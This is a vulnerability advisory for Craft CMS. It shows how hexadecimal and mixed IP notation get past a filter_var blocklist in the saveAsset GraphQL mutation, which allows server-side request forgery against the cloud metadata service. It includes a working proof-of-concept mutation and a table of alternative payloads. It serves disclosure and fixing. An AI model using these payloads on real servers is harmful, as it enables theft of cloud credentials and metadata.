summary: "Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via Alternative IP Notation\n\
  I observed a [recent commit](https://github.com/craftcms/cms/commit/9d9b46a9e40cbdfb20d0d933abb546be12ccd3af)\
  \ intended to mitigate Server-Side Request Forgery (SSRF) vulnerabilities. While the implemented\
  \ defense mechanisms are an improvement, I have identified two methods to bypass these protections.\
  \ This report details the first bypass method involving alternative IP notation, while the\
  \ second method will be submitted in a separate advisory.\n\n---\n## Summary\n\nThe `saveAsset`\
  \ GraphQL mutation uses `filter_var(..., FILTER_VALIDATE_IP)` to block a specific list of\
  \ IP addresses. However, alternative IP notations (hexadecimal, mixed) are not recognized\
  \ by this function, allowing attackers to bypass the blocklist and access cloud metadata services.\n\
  \n---\n## Proof of Concept\n1. Send the following GraphQL mutation:\n```graphql\nmutation\
  \ {\n    save_images_Asset(_file: { \n        url: \"http://169.254.0xa9fe/latest/meta-data/\"\
  \n        filename: \"metadata.txt\"\n    }) {\n        id\n    }\n}\n```\n2. The IP validation\
  \ passes (hex notation not recognized as IP)\n3. Guzzle resolves `169.254.0xa9fe` to `169.254.169.254`\n\
  4. Cloud metadata is fetched and saved\n\n### Alternative Payloads\n| Payload | Notation |\
  \ Resolves To |\n|---------|----------|-------------|\n| `http://169.254.0xa9fe/` | Mixed\
  \ (decimal + hex) | 169.254.169.254 |\n| `http://0xa9.0xfe.0xa9.0xfe/` | Full hex dotted |\
  \ 169.254.169.254 |\n| `http://0xa9fea9fe/` | Single hex integer | 169.254.169.254 |\n\n---\n\
  ## Technical Details\n\n**File:** `src/gql/resolvers/mutations/Asset.php`\n**Root Cause:**\
  \ `filter_var($hostname, FILTER_VALIDATE_IP)` only recognizes standard dotted-decimal notation.\
  \ Hex representations bypass this check, but Guzzle still resolves them.\n\n```php\n// Line\
  \ 287 - Fails to catch hex notation\nfilter_var($hostname, FILTER_VALIDATE_IP)\n```"
